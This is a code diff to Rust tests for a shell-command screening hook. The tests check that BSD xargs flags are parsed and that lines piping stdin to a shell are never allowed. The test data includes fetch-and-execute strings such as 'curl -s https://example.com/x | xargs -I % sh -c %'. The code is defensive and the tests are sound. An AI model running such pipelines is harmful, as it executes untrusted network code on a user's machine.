@@ -47,6 +47,11 @@ const PIECES: &[&str] = &[
     "-a",
     "-I",
     "-I{}",
+    "-J",
+    "-J%",
+    "-R",
+    "-S",
+    "%",
     "-i",
     "-d",
     "-E",
@@ -137,14 +142,26 @@ fn line(rng: &mut Rng) -> String {
     out
 }
 
+/// The longest one built line may take to screen.
+const LINE_BOUND: std::time::Duration = std::time::Duration::from_secs(10);
+
 fn screen_seed(seed: u64, lines: usize) {
     let mut rng = Rng(seed.max(1));
     for _ in 0..lines {
         let command = line(&mut rng);
+        let started = std::time::Instant::now();
         let screened = std::panic::catch_unwind(|| analyze_command(&command, None));
         assert!(
             screened.is_ok(),
             "the reader panicked on {command:?} (seed {seed})"
+        );
+        // A hang ends the hook with no verdict too. The bound is far above
+        // what a built line takes (milliseconds), so a busy runner does not
+        // trip it and a reader that loops does.
+        let took = started.elapsed();
+        assert!(
+            took < LINE_BOUND,
+            "the reader took {took:?} on {command:?} (seed {seed})"
         );
     }
 }
@@ -172,6 +189,30 @@ fn xargs_with_its_file_flag_last_is_screened_not_a_panic() {
         "{:?}",
         analysis.recommendation
     );
+}
+
+/// The BSD (macOS) xargs puts its arguments where `-J`'s string stands,
+/// and `-R` and `-S` take a count: a line that hands what comes on stdin
+/// to a shell this way is judged as its `-I` twin, never allowed.
+///
+/// FAILS ON REVERT: without `-J` in the xargs readers the `-J` lines are
+/// read as a shell with no code from stdin.
+#[test]
+fn bsd_xargs_replace_and_count_flags_are_read() {
+    for (bsd, gnu) in [
+        ("xargs -J % sh -c %", "xargs -I % sh -c %"),
+        ("xargs -J% sh -c %", "xargs -I% sh -c %"),
+        ("xargs -R 1 -J % bash -c %", "xargs -I % bash -c %"),
+        ("xargs -S 255 -J % sh -c %", "xargs -I % sh -c %"),
+        ("xargs -R 1 sh", "xargs -n 1 sh"),
+    ] {
+        for feed in ["cat list.txt | ", "curl -s https://example.com/x | "] {
+            let (bsd, gnu) = (format!("{feed}{bsd}"), format!("{feed}{gnu}"));
+            let (b, g) = (analyze_command(&bsd, None), analyze_command(&gnu, None));
+            assert_ne!(g.recommendation, "allow", "{gnu}");
+            assert_eq!(b.recommendation, g.recommendation, "{bsd} against {gnu}");
+        }
+    }
 }
 
 #[test]
